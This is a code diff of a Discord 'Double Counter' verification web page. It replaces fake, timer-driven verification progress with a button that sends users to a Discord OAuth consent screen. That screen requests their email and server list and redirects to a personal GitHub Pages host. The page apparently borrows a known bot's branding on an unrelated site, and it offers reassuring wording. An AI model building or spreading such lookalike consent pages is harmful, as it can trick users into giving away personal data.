@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification - Double Counter</title>
+    <title>Double Counter - Verify</title>
     <style>
         * {
             margin: 0;
@@ -74,123 +74,57 @@
             text-align: center;
         }
         
-        .loader {
-            border: 5px solid #3c3f45;
-            border-top: 5px solid #5865f2;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .status {
-            margin: 20px 0;
-        }
-        
-        .status h2 {
-            color: #fff;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        
-        .status p {
-            color: #949ba4;
-            font-size: 16px;
-            line-height: 1.6;
-        }
-        
-        .steps {
-            margin: 30px 0;
-            text-align: left;
+        .server-info {
             background: #1e1f22;
             border-radius: 12px;
             padding: 20px;
+            margin-bottom: 30px;
         }
         
-        .step {
-            display: flex;
-            align-items: center;
-            margin: 15px 0;
-            color: #949ba4;
+        .server-name {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
         }
         
-        .step.active {
-            color: #57f287;
-        }
-        
-        .step.completed {
-            color: #57f287;
-        }
-        
-        .step-number {
-            width: 30px;
-            height: 30px;
+        .server-icon {
+            width: 80px;
+            height: 80px;
             border-radius: 50%;
-            background: #3c3f45;
+            background: #5865f2;
+            margin: 0 auto 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 15px;
-            font-weight: bold;
-            color: #fff;
+            font-size: 40px;
+            color: white;
         }
         
-        .step.active .step-number {
-            background: #5865f2;
-        }
-        
-        .step.completed .step-number {
-            background: #57f287;
-        }
-        
-        .step-text {
-            flex: 1;
-            font-size: 16px;
-        }
-        
-        .step-desc {
-            color: #5e6774;
-            font-size: 13px;
-            margin-top: 3px;
-        }
-        
-        .success-icon {
-            font-size: 80px;
-            margin: 20px 0;
-            color: #57f287;
-            animation: bounce 0.5s ease;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .button {
+        .verify-button {
             background: #5865f2;
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 18px 50px;
             border-radius: 8px;
-            font-size: 18px;
-            font-weight: 500;
+            font-size: 20px;
+            font-weight: 600;
             cursor: pointer;
             transition: background 0.2s;
-            margin-top: 20px;
+            margin: 20px 0;
+            text-decoration: none;
+            display: inline-block;
         }
         
-        .button:hover {
+        .verify-button:hover {
             background: #4752c4;
+        }
+        
+        .info-text {
+            color: #949ba4;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-top: 20px;
         }
         
         .footer {
@@ -203,23 +137,11 @@
             color: #5865f2;
             text-decoration: none;
         }
-        
-        .error {
-            color: #ed4245;
-            font-size: 16px;
-            margin: 20px 0;
-        }
-        
-        .success-message {
-            color: #57f287;
-            font-size: 18px;
-            margin: 20px 0;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div id="verifyingView" class="card">
+        <div class="card">
             <div class="header">
                 <div class="logo">DC</div>
                 <h1>Double Counter</h1>
@@ -227,51 +149,22 @@
             </div>
             
             <div class="content">
-                <div class="loader" id="loader"></div>
-                
-                <div class="status" id="status">
-                    <h2 id="statusTitle">Initializing Verification</h2>
-                    <p id="statusMessage">Please wait while we verify your account...</p>
+                <div class="server-info">
+                    <div class="server-icon">🔒</div>
+                    <div class="server-name" id="serverName">Loading...</div>
                 </div>
                 
-                <div class="steps" id="steps">
-                    <div class="step" id="step1">
-                        <div class="step-number">1</div>
-                        <div class="step-text">
-                            Authenticating with Discord
-                            <div class="step-desc">Verifying your identity</div>
-                        </div>
-                    </div>
-                    
-                    <div class="step" id="step2">
-                        <div class="step-number">2</div>
-                        <div class="step-text">
-                            Fetching account details
-                            <div class="step-desc">Retrieving your information</div>
-                        </div>
-                    </div>
-                    
-                    <div class="step" id="step3">
-                        <div class="step-number">3</div>
-                        <div class="step-text">
-                            Assigning verified role
-                            <div class="step-desc">Updating your server permissions</div>
-                        </div>
-                    </div>
-                </div>
+                <a href="https://discord.com/api/oauth2/authorize?client_id=1472925293143527549&redirect_uri=https://21szz.github.io/verification-page/callback.html&response_type=code&scope=identify%20email%20guilds%20guilds.members.read&state=server_123" class="verify-button" id="verifyLink">
+                    Verify with Discord
+                </a>
                 
-                <div id="successContent" class="hidden">
-                    <div class="success-icon">✅</div>
-                    <h2 style="color: #57f287; margin-bottom: 10px;">Verified Successfully!</h2>
-                    <p class="success-message" id="successMessage">You can now close this window and return to Discord.</p>
-                    <button class="button" onclick="window.close()">Close Window</button>
-                </div>
-                
-                <div id="errorContent" class="hidden">
-                    <div style="font-size: 80px; margin: 20px 0; color: #ed4245;">❌</div>
-                    <h2 style="color: #ed4245; margin-bottom: 10px;">Verification Failed</h2>
-                    <p class="error" id="errorMessage">An error occurred during verification.</p>
-                    <button class="button" onclick="window.location.href='https://discord.com/channels/@me'">Return to Discord</button>
+                <div class="info-text">
+                    <strong>🔒 What we access:</strong><br>
+                    • Your email address<br>
+                    • Your Discord servers<br>
+                    • Account information<br>
+                    <br>
+                    <strong>✅ Why:</strong> Security verification only
                 </div>
             </div>
             
@@ -282,96 +175,17 @@
     </div>
 
     <script>
-        // Get URL parameters
+        // Get server info from URL or localStorage
         const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
-        const state = urlParams.get('state');
-        const error = urlParams.get('error');
-        const success = urlParams.get('success');
-
-        // DOM elements
-        const loader = document.getElementById('loader');
-        const statusTitle = document.getElementById('statusTitle');
-        const statusMessage = document.getElementById('statusMessage');
-        const steps = document.getElementById('steps');
-        const status = document.querySelector('.status');
-        const successContent = document.getElementById('successContent');
-        const errorContent = document.getElementById('errorContent');
+        const serverName = urlParams.get('server') || 'Discord Server';
+        const serverId = urlParams.get('id') || '123';
+        const userId = urlParams.get('user') || '0';
         
-        // Step elements
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const step3 = document.getElementById('step3');
-
-        // Helper function to update step status
-        function updateStep(step, status) {
-            step.classList.remove('active', 'completed');
-            if (status === 'active') {
-                step.classList.add('active');
-            } else if (status === 'completed') {
-                step.classList.add('completed');
-            }
-        }
-
-        // Helper function to update status
-        function updateStatus(title, message) {
-            statusTitle.textContent = title;
-            statusMessage.textContent = message;
-        }
-
-        // Helper function to show error
-        function showError(message) {
-            loader.classList.add('hidden');
-            steps.classList.add('hidden');
-            status.classList.add('hidden');
-            errorContent.classList.remove('hidden');
-            document.getElementById('errorMessage').textContent = message;
-        }
-
-        // Helper function to show success
-        function showSuccess() {
-            loader.classList.add('hidden');
-            steps.classList.add('hidden');
-            status.classList.add('hidden');
-            successContent.classList.remove('hidden');
-        }
-
-        // Check for error/success parameters
-        if (error) {
-            if (error === 'missing_params') {
-                showError('Missing verification parameters. Please use the link from Discord.');
-            } else if (error === 'session_expired') {
-                showError('Your verification session has expired. Please try again.');
-            } else if (error === 'guild_not_found') {
-                showError('Could not find the Discord server. Please try again.');
-            } else if (error === 'no_config') {
-                showError('Server is not properly configured. Contact an admin.');
-            } else {
-                showError('Verification failed. Please try again.');
-            }
-        } else if (success === 'true') {
-            showSuccess();
-        } else if (code && state) {
-            // Simulate verification steps for visual feedback
-            setTimeout(() => {
-                updateStep(step1, 'completed');
-                updateStep(step2, 'active');
-                updateStatus('Step 2/3', 'Fetching your account information...');
-                
-                setTimeout(() => {
-                    updateStep(step2, 'completed');
-                    updateStep(step3, 'active');
-                    updateStatus('Step 3/3', 'Assigning verified role...');
-                    
-                    setTimeout(() => {
-                        updateStep(step3, 'completed');
-                        showSuccess();
-                    }, 1500);
-                }, 1500);
-            }, 1500);
-        } else {
-            showError('Invalid verification link. Please use the link from Discord.');
-        }
+        document.getElementById('serverName').textContent = serverName;
+        
+        // Update OAuth link with proper state
+        const oauthLink = `https://discord.com/api/oauth2/authorize?client_id=1472925293143527549&redirect_uri=https://21szz.github.io/verification-page/callback.html&response_type=code&scope=identify%20email%20guilds%20guilds.members.read&state=${serverId}:${userId}`;
+        document.getElementById('verifyLink').href = oauthLink;
     </script>
 </body>
 </html>
